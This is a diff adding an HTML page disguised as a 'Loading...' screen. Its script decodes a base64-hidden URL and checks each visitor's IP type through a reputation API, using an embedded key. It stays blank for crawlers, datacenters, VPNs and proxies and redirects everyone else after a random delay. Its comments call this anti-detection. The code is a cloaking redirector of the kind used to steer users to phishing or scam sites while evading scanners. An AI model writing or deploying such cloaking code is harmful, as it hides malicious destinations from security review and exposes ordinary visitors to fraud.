@@ -1,0 +1,78 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Loading...</title>
+<style>
+  html,body{margin:0;padding:0;height:100%;background:#fff;color:#222;font-family:Arial;}
+  #xw{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;transition:opacity .3s}
+  #x1{width:70px;height:70px;border-radius:50%;border:6px solid rgba(0,0,0,.08);border-top:6px solid #ff3b30;animation:sp 1s linear infinite}
+  #x2{margin-top:14px;font-size:16px}
+  @keyframes sp{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+
+<div id="xw" style="opacity:0;pointer-events:none;">
+  <div id="x1"></div>
+  <div id="x2">Loading...</div>
+</div>
+
+<script>
+(function(){
+
+  // URL BARU KAMU (sudah di-encode)
+  const u = atob("aHR0cHM6Ly9tZWppa3VoaWJpbml1LmdsZWV6ZS5jb20vZ28vNTNiZDA1MmY=");
+
+  const k = "9516c3e4-5fac-44cd-b3da-2007fd0918fb";
+
+  const rnd = (min,max)=>Math.floor(Math.random()*(max-min+1))+min;
+
+  async function q93z() {
+    try {
+      const resp = await fetch("https://api.ipdetective.io/ip?info=true", {
+        method: "GET",
+        mode: "cors",
+        cache: "no-store",
+        headers: {
+          "x-api-key": k,
+          "Accept": "application/json",
+          "X-Requested-With": Math.random().toString(36).slice(2)
+        }
+      });
+
+      if (!resp.ok) return;
+
+      let data = await resp.json().catch(()=>null);
+      if (!data) return;
+
+      let tp = (data.type || "").toLowerCase().trim();
+
+      const deny = ["datacenter","crawler","automation","hosting","vpn","proxy"];
+
+      if (deny.some(w => tp.includes(w))) {
+        return; // diam → halaman tetap kosong
+      }
+
+      go(u);
+
+    } catch(e){
+      // silent → anti deteksi
+    }
+  }
+
+  function go(link){
+    const x = document.getElementById("xw");
+    x.style.pointerEvents = "auto";
+    x.style.opacity = 1;
+
+    setTimeout(()=>location.replace(link), rnd(500,1200));
+  }
+
+  setTimeout(q93z, rnd(300,900));
+
+})();
+</script>
+
+</body>
+</html>
